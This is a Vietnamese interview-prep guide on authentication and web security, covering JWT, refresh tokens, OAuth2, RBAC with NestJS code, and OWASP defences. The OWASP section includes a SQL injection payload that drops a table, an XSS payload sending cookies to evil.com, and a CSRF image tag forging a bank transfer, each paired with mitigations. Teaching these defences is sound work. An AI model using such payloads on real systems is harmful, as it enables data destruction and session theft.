# PHẦN 7: AUTHENTICATION & WEB SECURITY - GIẢI THÍCH CHI TIẾT

> **Mức độ ưu tiên: CAO**
> Bảo mật là yêu cầu bắt buộc trong mọi ứng dụng. JD yêu cầu rõ: JWT, OAuth2,
> phân quyền, kiểm soát truy cập. Đây cũng là phần hay hỏi "follow-up questions".

---

## 1. AUTHENTICATION vs AUTHORIZATION

```
AUTHENTICATION (Xác thực) - "Bạn là AI?"
→ Xác minh danh tính người dùng
→ Login bằng username/password, fingerprint, OAuth...
→ Kết quả: biết bạn là Alice

AUTHORIZATION (Phân quyền) - "Alice được làm gì?"
→ Kiểm tra quyền hạn sau khi đã biết danh tính
→ Role-based, Permission-based access control
→ Kết quả: Alice có quyền xem nhưng không có quyền xóa

Flow:
1. User login (email + password) → Authentication
2. Server verify → Cấp JWT token
3. User gửi request kèm token → Server verify token (Authentication)
4. Kiểm tra user có quyền thực hiện action → Authorization
```

---

## 2. JWT (JSON WEB TOKEN)

### JWT là gì?

JWT = chuỗi string mã hoá, chứa thông tin user, được server ký (sign) để verify.
Stateless: server KHÔNG cần lưu session, chỉ cần verify chữ ký.

### Cấu trúc JWT:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.     ← HEADER
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFsaWNlIn0.  ← PAYLOAD
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c        ← SIGNATURE

Phân tách bởi dấu chấm (.)
```

```
HEADER (thuật toán + loại token):
{
  "alg": "HS256",    // Thuật toán: HMAC SHA-256
  "typ": "JWT"       // Loại: JWT
}
→ Base64Url encode

PAYLOAD (data, claims):
{
  "sub": "123",       // Subject (user ID)
  "email": "alice@test.com",
  "roles": ["user"],
  "iat": 1516239022,  // Issued At (thời điểm tạo)
  "exp": 1516242622   // Expiration (thời điểm hết hạn)
}
→ Base64Url encode
⚠️ KHÔNG chứa sensitive data (password)! Vì payload chỉ encode, KHÔNG encrypt.

SIGNATURE:
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret_key
)
→ Đảm bảo token KHÔNG bị sửa đổi
→ Chỉ server có secret_key mới tạo/verify được
```

### Access Token + Refresh Token Flow:

```
Tại sao cần 2 loại token?

Access Token:
- Ngắn hạn (15-30 phút)
- Gửi kèm MỖI request
- Nếu bị đánh cắp → hacker chỉ dùng được trong thời gian ngắn

Refresh Token:
- Dài hạn (7-30 ngày)
- CHỈ dùng để lấy Access Token mới
- Lưu riêng, bảo mật hơn (httpOnly cookie)
- Có thể revoke (lưu trong DB)
```

```
┌──────────────────────────────────────────────────────────────┐
│                    AUTH FLOW                                   │
│                                                               │
│  1. LOGIN                                                     │
│     Client ──[email + password]──> Server                     │
│                                   │                           │
│                                   ├─ Verify credentials       │
│                                   ├─ Generate Access Token    │
│                                   ├─ Generate Refresh Token   │
│                                   │                           │
│     Client <──[access + refresh]── Server                     │
│                                                               │
│  2. API REQUEST                                               │
│     Client ──[Authorization: Bearer <access_token>]──> Server │
│                                                    │          │
│                                              Verify JWT       │
│                                              Check expiry     │
│                                                    │          │
│     Client <──────── [Response] ──────────── Server           │
│                                                               │
│  3. TOKEN REFRESH (khi access token hết hạn)                  │
│     Client ──[refresh_token]──> /auth/refresh                 │
│                                   │                           │
│                                   ├─ Verify refresh token     │
│                                   ├─ Check in DB (not revoked)│
│                                   ├─ Generate NEW access token│
│                                   ├─ (Optional) Rotate refresh│
│                                   │                           │
│     Client <──[new access token]── Server                     │
│                                                               │
│  4. LOGOUT                                                    │
│     Client ──[refresh_token]──> /auth/logout                  │
│                                   │                           │
│                              Revoke refresh token (DB)        │
│                              Remove from client               │
└──────────────────────────────────────────────────────────────┘
```

### Token Storage (HAY HỎI):

```
Lưu token ở đâu phía Client?

1. localStorage:
   ✅ Dễ dùng, persistent
   ❌ Dễ bị XSS attack (JavaScript có thể đọc)

2. sessionStorage:
   ✅ Mất khi đóng tab
   ❌ Dễ bị XSS attack

3. HttpOnly Cookie (RECOMMENDED cho Refresh Token):
   ✅ JavaScript KHÔNG đọc được → an toàn hơn XSS
   ✅ Tự động gửi kèm request
   ❌ CSRF vulnerability → cần SameSite + CSRF token

4. Memory (biến JavaScript):
   ✅ An toàn nhất (mất khi refresh page)
   ❌ Không persistent

BEST PRACTICE:
- Access Token  → Memory (biến JS) hoặc sessionStorage
- Refresh Token → HttpOnly Secure SameSite Cookie
```

### Implementation trong NestJS:

```typescript
// auth.module.ts
@Module({
  imports: [
    JwtModule.registerAsync({
      imports: [ConfigModule],
      useFactory: (config: ConfigService) => ({
        secret: config.get('JWT_SECRET'),
        signOptions: { expiresIn: '15m' },  // Access token: 15 phút
      }),
      inject: [ConfigService],
    }),
    PassportModule,
    UsersModule,
  ],
  controllers: [AuthController],
  providers: [AuthService, JwtStrategy, LocalStrategy],
})
export class AuthModule {}

// auth.service.ts
@Injectable()
export class AuthService {
  constructor(
    private usersService: UsersService,
    private jwtService: JwtService,
    @InjectRepository(RefreshToken)
    private refreshTokenRepo: Repository<RefreshToken>,
  ) {}
  
  async login(loginDto: LoginDto) {
    // 1. Verify credentials
    const user = await this.usersService.findByEmail(loginDto.email);
    if (!user) throw new UnauthorizedException('Invalid credentials');
    
    const isPasswordValid = await bcrypt.compare(loginDto.password, user.password);
    if (!isPasswordValid) throw new UnauthorizedException('Invalid credentials');
    
    // 2. Generate tokens
    const payload = { sub: user.id, email: user.email, roles: user.roles };
    
    const accessToken = this.jwtService.sign(payload);
    const refreshToken = this.jwtService.sign(payload, { expiresIn: '7d' });
    
    // 3. Save refresh token in DB (để có thể revoke)
    await this.refreshTokenRepo.save({
      token: refreshToken,
      userId: user.id,
      expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
    });
    
    return {
      accessToken,
      refreshToken,
      user: { id: user.id, name: user.name, email: user.email },
    };
  }
  
  async refresh(refreshToken: string) {
    // 1. Verify refresh token
    const payload = this.jwtService.verify(refreshToken);
    
    // 2. Check in DB (not revoked)
    const stored = await this.refreshTokenRepo.findOne({
      where: { token: refreshToken, isRevoked: false },
    });
    if (!stored) throw new UnauthorizedException('Invalid refresh token');
    
    // 3. Generate new access token
    const newAccessToken = this.jwtService.sign({
      sub: payload.sub,
      email: payload.email,
      roles: payload.roles,
    });
    
    return { accessToken: newAccessToken };
  }
  
  async logout(refreshToken: string) {
    // Revoke refresh token
    await this.refreshTokenRepo.update(
      { token: refreshToken },
      { isRevoked: true },
    );
  }
}

// jwt.strategy.ts (Passport strategy)
@Injectable()
export class JwtStrategy extends PassportStrategy(Strategy) {
  constructor(config: ConfigService) {
    super({
      jwtFromRequest: ExtractJwt.fromAuthHeaderAsBearerToken(),
      ignoreExpiration: false,
      secretOrKey: config.get('JWT_SECRET'),
    });
  }
  
  async validate(payload: any) {
    // Payload đã được verify, trả về user info
    // Sẽ được gắn vào request.user
    return {
      id: payload.sub,
      email: payload.email,
      roles: payload.roles,
    };
  }
}
```

---

## 3. OAUTH2

### OAuth2 là gì?

OAuth2 = framework cho phép ứng dụng bên thứ 3 truy cập resource của user
KHÔNG CẦN biết password.

```
Ví dụ thực tế: "Login with Google"
1. User click "Login with Google" trên app của bạn
2. User được redirect sang Google
3. User đồng ý cho app truy cập tên + email
4. Google gửi "authorization code" về app
5. App dùng code để lấy access token từ Google
6. App dùng token để lấy thông tin user từ Google API
→ User KHÔNG bao giờ nhập Google password trên app của bạn
```

### Authorization Code Flow (quan trọng nhất):

```
┌────────┐                              ┌────────────┐    ┌──────────┐
│  User  │                              │  Your App  │    │  Google  │
│(Browser)│                              │  (Server)  │    │  (Auth)  │
└───┬────┘                              └─────┬──────┘    └────┬─────┘
    │                                         │                 │
    │ 1. Click "Login with Google"            │                 │
    ├────────────────────────────────────────>│                 │
    │                                         │                 │
    │ 2. Redirect to Google Auth              │                 │
    │<────────────────────────────────────────┤                 │
    │                                         │                 │
    │ 3. User login & consent on Google       │                 │
    ├────────────────────────────────────────────────────────>│
    │                                         │                 │
    │ 4. Redirect back with authorization code│                 │
    │<─────────────────────────────────────────────────────────┤
    ├────────────────────────────────────────>│                 │
    │                                         │                 │
    │                                         │ 5. Exchange     │
    │                                         │    code for     │
    │                                         │    access token │
    │                                         ├────────────────>│
    │                                         │                 │
    │                                         │ 6. Receive      │
    │                                         │    access token │
    │                                         │<────────────────┤
    │                                         │                 │
    │                                         │ 7. Fetch user   │
    │                                         │    profile      │
    │                                         ├────────────────>│
    │                                         │                 │
    │                                         │ 8. User info    │
    │                                         │<────────────────┤
    │                                         │                 │
    │ 9. Create/login user, return JWT        │                 │
    │<────────────────────────────────────────┤                 │
```

### Các OAuth2 Flows:

```
1. Authorization Code Flow (RECOMMENDED cho web apps)
   → Full flow ở trên
   → An toàn nhất: code exchange qua backend, token không expose cho browser

2. Authorization Code + PKCE (cho SPA, mobile)
   → Thêm Proof Key for Code Exchange
   → Không cần client secret (vì SPA không giữ secret an toàn)

3. Client Credentials (server-to-server)
   → Service A gọi Service B
   → Không có user involvement
   → Dùng client_id + client_secret

4. Resource Owner Password (LEGACY - tránh dùng)
   → User nhập password trực tiếp vào app
   → App gửi password đến auth server
   → Chỉ dùng cho first-party apps (bạn own cả app và auth server)
```

---

## 4. RBAC (ROLE-BASED ACCESS CONTROL)

### Concept:

```
USER → có ROLE → Role có PERMISSIONS

Ví dụ:
├── Admin role:
│   ├── users:create
│   ├── users:read
│   ├── users:update
│   ├── users:delete     ← Chỉ Admin
│   ├── products:*       ← Tất cả quyền products
│   └── reports:read
│
├── Manager role:
│   ├── users:read
│   ├── products:create
│   ├── products:read
│   ├── products:update
│   └── reports:read
│
└── User role:
    ├── products:read    ← Chỉ đọc
    └── profile:update   ← Sửa profile mình
```

### Implementation trong NestJS:

```typescript
// roles.decorator.ts
export const Roles = (...roles: string[]) => SetMetadata('roles', roles);

// roles.guard.ts
@Injectable()
export class RolesGuard implements CanActivate {
  constructor(private reflector: Reflector) {}
  
  canActivate(context: ExecutionContext): boolean {
    const requiredRoles = this.reflector.getAllAndOverride<string[]>('roles', [
      context.getHandler(),
      context.getClass(),
    ]);
    
    if (!requiredRoles) return true;
    
    const { user } = context.switchToHttp().getRequest();
    return requiredRoles.some(role => user.roles?.includes(role));
  }
}

// Sử dụng:
@Controller('users')
@UseGuards(JwtAuthGuard, RolesGuard)
export class UsersController {
  @Get()
  @Roles('admin', 'manager')  // Chỉ admin và manager xem danh sách
  findAll() { }
  
  @Delete(':id')
  @Roles('admin')  // Chỉ admin xóa
  remove(@Param('id') id: string) { }
  
  @Get('profile')
  // Không có @Roles → mọi authenticated user
  getProfile(@Request() req) {
    return req.user;
  }
}
```

### RBAC vs ABAC:

```
RBAC (Role-Based):
- Kiểm tra dựa trên ROLE
- "Admin có thể xóa user"
- Đơn giản, phổ biến
- Đủ cho hầu hết ứng dụng

ABAC (Attribute-Based):
- Kiểm tra dựa trên ATTRIBUTES (role + context + resource + environment)
- "Manager chỉ xóa user TRONG department của mình, và CHỈ trong giờ làm việc"
- Phức tạp hơn, linh hoạt hơn
- Dùng khi RBAC không đủ

Ví dụ ABAC:
if (user.role === 'manager' 
    && resource.departmentId === user.departmentId
    && currentTime.isBusinessHours()) {
  allow();
}
```

---

## 5. WEB SECURITY (OWASP TOP 10)

### 5.1 SQL Injection

```
Tấn công: Chèn SQL code vào input

url: /users?search='; DROP TABLE users; --

❌ Vulnerable code:
const query = `SELECT * FROM users WHERE name = '${req.query.search}'`;
// → SELECT * FROM users WHERE name = ''; DROP TABLE users; --'
// → XÓA CẢ BẢNG!

✅ PHÒNG CHỐNG:
// 1. Parameterized queries (TypeORM tự làm)
const users = await userRepo.find({ where: { name: search } });

// 2. Query Builder với parameters
const users = await userRepo.createQueryBuilder('user')
  .where('user.name = :name', { name: search })  // :name = parameterized
  .getMany();

// 3. KHÔNG BAO GIỜ nối string vào SQL
```

### 5.2 XSS (Cross-Site Scripting)

```
Tấn công: Chèn JavaScript code vào trang web

Input: <script>document.location='https://evil.com?cookie='+document.cookie</script>
→ Nếu render trực tiếp → chạy script → đánh cắp cookie

PHÒNG CHỐNG:
1. Input sanitization: loại bỏ HTML tags
   import * as sanitizeHtml from 'sanitize-html';
   const clean = sanitizeHtml(userInput);

2. Output encoding: escape special characters khi render
   < → &lt;   > → &gt;   & → &amp;

3. Content-Security-Policy header:
   Content-Security-Policy: script-src 'self'
   → Chỉ chạy scripts từ domain hiện tại

4. HttpOnly cookies: JS không đọc được cookies
```

### 5.3 CSRF (Cross-Site Request Forgery)

```
Tấn công: Lừa user thực hiện action không mong muốn trên site đã login

Ví dụ: User đang login bank.com
Hacker gửi email chứa:
<img src="https://bank.com/transfer?to=hacker&amount=1000">
→ Browser tự gửi request + cookies → Transfer tiền!

PHÒNG CHỐNG:
1. SameSite cookies:
   Set-Cookie: session=abc; SameSite=Strict; Secure; HttpOnly
   → Cookie KHÔNG gửi khi request từ domain khác

2. CSRF Token:
   Server tạo token random → gắn vào form/header
   Mỗi request phải kèm token → server verify
   Hacker không biết token → request fail

3. Check Origin/Referer header
```

### 5.4 CORS (Cross-Origin Resource Sharing)

```
CORS = cơ chế cho phép/chặn requests từ domain KHÁC

Ví dụ:
Frontend: https://myapp.com
Backend:  https://api.myapp.com
→ Đây là CROSS-ORIGIN (khác domain)
→ Browser sẽ CHẶN nếu server không cho phép
```

```typescript
// NestJS CORS config
app.enableCors({
  origin: ['https://myapp.com', 'https://admin.myapp.com'],  // Domains được phép
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
  credentials: true,         // Cho phép gửi cookies
  allowedHeaders: ['Content-Type', 'Authorization'],
});

// ❌ ĐỪNG dùng trong production:
app.enableCors({ origin: '*' });  // Cho phép mọi domain → KHÔNG an toàn
```

### 5.5 Password Hashing

```typescript
// KHÔNG BAO GIỜ lưu password dạng plain text!
// Dùng bcrypt hoặc argon2

import * as bcrypt from 'bcrypt';

// Hash password (khi register)
const saltRounds = 10;  // Cost factor (cao hơn = chậm hơn = an toàn hơn)
const hashedPassword = await bcrypt.hash('user_password', saltRounds);
// → $2b$10$xJ3kZ... (hash khác nhau mỗi lần, dù cùng password)

// Verify password (khi login)
const isMatch = await bcrypt.compare('user_password', hashedPassword);
// → true/false

// Tại sao bcrypt?
// 1. Tự thêm salt (chống rainbow table)
// 2. Cost factor có thể tăng (chống brute force khi CPU nhanh hơn)
// 3. Cùng password → hash KHÁC nhau (do random salt)
```

### 5.6 Helmet.js (Security Headers)

```typescript
import helmet from 'helmet';

app.use(helmet());
// Tự động set nhiều security headers:
// X-Content-Type-Options: nosniff
// X-Frame-Options: DENY (chống clickjacking)
// X-XSS-Protection: 0 (deprecated, CSP thay thế)
// Strict-Transport-Security (HSTS)
// Content-Security-Policy
```

### 5.7 Rate Limiting

```typescript
// Chống brute force, DDoS
// NestJS: @nestjs/throttler

@Module({
  imports: [
    ThrottlerModule.forRoot({
      ttl: 60000,    // 60 giây
      limit: 10,     // Max 10 requests per 60s
    }),
  ],
})
export class AppModule {}

// Áp dụng global
app.useGlobalGuards(new ThrottlerGuard());

// Hoặc custom per-route
@Controller('auth')
export class AuthController {
  @Throttle({ default: { limit: 5, ttl: 60000 } })  // 5 attempts / 60s
  @Post('login')
  login(@Body() dto: LoginDto) { }
}
```

---

## TÓM TẮT PHẦN 7

### Câu hỏi phỏng vấn:

**1. "JWT hoạt động thế nào?"**
→ JWT gồm 3 phần: Header (algorithm), Payload (data), Signature (chữ ký).
Server sign bằng secret key. Client gửi kèm mỗi request. Server verify signature, 
không cần lưu session.

**2. "Access Token vs Refresh Token?"**
→ Access: ngắn hạn (15min), gửi mỗi request. Refresh: dài hạn (7 ngày), 
chỉ dùng lấy access token mới. Refresh lưu trong httpOnly cookie, 
có thể revoke trong DB.

**3. "Token lưu ở đâu? Tại sao?"**
→ Access token: memory/sessionStorage. Refresh token: httpOnly secure cookie.
HttpOnly ngăn XSS đọc token. SameSite ngăn CSRF.

**4. "OAuth2 Authorization Code Flow?"**
→ User → redirect Auth server → login & consent → redirect back with code →
App exchange code for token → fetch user info. An toàn vì code exchange qua backend.

**5. "RBAC là gì?"**
→ User có Roles, Roles có Permissions. Kiểm tra role trước khi cho phép action.
NestJS: custom Roles decorator + RolesGuard.

**6. "Cách phòng chống SQL Injection?"**
→ Parameterized queries (TypeORM tự động). KHÔNG BAO GIỜ nối string vào SQL.

**7. "XSS vs CSRF?"**
→ XSS: chèn script vào trang (fix: sanitize input, CSP, httpOnly cookies).
CSRF: lừa browser gửi request (fix: SameSite cookies, CSRF token).
